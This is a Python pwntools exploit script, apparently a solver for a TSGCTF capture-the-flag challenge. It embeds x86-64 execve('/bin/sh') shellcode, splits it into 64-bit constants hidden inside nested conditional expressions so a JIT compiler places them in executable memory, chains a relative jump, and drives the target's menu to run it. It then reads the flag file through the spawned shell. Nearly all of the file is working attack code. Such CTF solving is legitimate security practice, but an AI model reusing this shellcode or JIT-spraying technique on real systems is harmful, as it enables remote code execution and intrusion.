from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import sys

context.log_level = 'error'

is_gaibu = True
log = False
host = sys.argv[1]
port = int(sys.argv[2])

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b'>'):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
values = []
for i in range(0, len(shellcode), 8):
    values.append(just_u64(shellcode[i:i+8]))

'''
0x7fe68c202000:	0x40ec8348e5894855	0x48c1890000002ab8
0x7fe68c202010:	0x7dc000bf48f87d89	0x3f8b4800007fe68c
0x7fe68c202020:	0x20a0ba48f8758b48	0x2ab800007fe68c20
0x7fe68c202030:	0x8948c08941000000	0x4d8948c7894cf07d
0x7fe68c202040:	0x48d2ffe0758948e8	0x0055a54e2c33d0b9
0x7fe68c202050:	0xf0558b48c9314500	0x55a5483bd5d0be48
0x7fe68c202060:	0x4e2c33d0bf480000	0x48d23145000055a5
0x7fe68c202070:	0x8b48d78948d87d89	0x8948d0758948e055
0x7fe68c202080:	0x4d8948d8558b48d6	0x48c08949d18944c8
0x7fe68c202090:	0xffc44d8944d0458b	0x00c35d40c48348d0
0x7fe68c2020a0:	0x48c189deadbeefb8	0xccccccccccccccba
0x7fe68c2020b0:	0x8b48f8247c8948cc	0x4800ff8348f8247c
0x7fe68c2020c0:	0x00c3c88948ca450f	0x0000000000000000
'''

'''
0x7fa48d5a2000:	0x40ec8348e5894855	0x48c1890000002ab8
0x7fa48d5a2010:	0xb7c000bf48f87d89	0x3f8b4800007fa48d
0x7fa48d5a2020:	0x20a0ba48f8758b48	0x2ab800007fa48d5a
0x7fa48d5a2030:	0x8948c08941000000	0x4d8948c7894cf07d
0x7fa48d5a2040:	0x48d2ffe0758948e8	0x005583e5c443d0b9
0x7fa48d5a2050:	0xf0558b48c9314500	0x5583e077d5d0be48
0x7fa48d5a2060:	0xe5c443d0bf480000	0x48d2314500005583
0x7fa48d5a2070:	0x8b48d78948d87d89	0x8948d0758948e055
0x7fa48d5a2080:	0x4d8948d8558b48d6	0x48c08949d18944c8
'''

print(len(values))
s4 = 0xffffff5be9 # jmp -0xa0
s3 = f"x/72057594037927936-63?{s4}:{values[3]}"
s2 = f"x*0x1000000/72057594037927936-191?{s3}:{values[2]}"
s1 = f"x/72057594037927936-72?{s2}:{values[1]}"
s0 = f"x/72057594037927936-64?{s1}:{values[0]}";

numbers = [x for x in range(100)]
# create
rs(b"1")
rs(str(len(numbers)).encode("ascii"))
for x in numbers:
    sendline(str(x).encode("ascii"))

# delete
rs(b"3")

# set_map
rs(b"4")
#x = f"x?{x}:3735928559"
def f(idx):
    if len(values) <= idx:
        return str(x)
    value = values[idx]
    s = f(idx + 1)
    return f"x-{value}?{s}:{idx}"

x = s0
print(x)
rs(x.encode("ascii"))

# protect
rs(b"2")
rs(b"y")
rs(b"y")
rs(b"y")

rs(b"5")

sendline(b"cat /home/user/flag-26dec3e0f05adecded30266312a10975")
s = recvline()
print(s)
if b"TSGCTF" in s:
    exit(0)
else:
    exit(1)



interactive()
